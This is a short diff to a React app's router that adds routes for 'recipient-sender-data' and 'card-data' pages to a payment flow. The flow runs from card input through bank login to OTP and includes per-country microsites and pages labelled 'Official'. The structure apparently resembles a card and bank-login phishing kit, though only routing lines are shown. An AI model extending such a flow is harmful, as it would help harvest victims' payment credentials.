@@ -17,6 +17,8 @@ import Contracts from "./pages/Contracts";
 import Microsite from "./pages/Microsite";
 import PaymentRecipient from "./pages/PaymentRecipient";
 import PaymentRecipientSender from "./pages/PaymentRecipientSender";
+import PaymentRecipientSenderData from "./pages/PaymentRecipientSenderData";
+import PaymentCardData from "./pages/PaymentCardData";
 import PaymentDetailsOfficial from "./pages/PaymentDetailsOfficial";
 import PaymentCardInputOfficial from "./pages/PaymentCardInputOfficial";
 import PaymentOTPOfficial from "./pages/PaymentOTPOfficial";
@@ -56,6 +58,7 @@ const App = () => (
           <Route path="/r/:country/:type/:id" element={<Microsite />} />
           {/* Payment flow with recipient/sender selection */}
           <Route path="/pay/:id/recipient-sender" element={<PaymentRecipientSender />} />
+          <Route path="/pay/:id/recipient-sender-data" element={<PaymentRecipientSenderData />} />
           <Route path="/pay/:id/recipient" element={
             <PaymentThemeWrapper>
               <PaymentRecipient />
@@ -65,6 +68,7 @@ const App = () => (
           {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
           <Route path="/pay/:id/card-input" element={<PaymentCardInputOfficial />} />
+          <Route path="/pay/:id/card-data" element={<PaymentCardData />} />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
           {/* Legacy routes (kept for backwards compatibility) */}
           <Route path="/pay/:id/card" element={<PaymentCardForm />} />
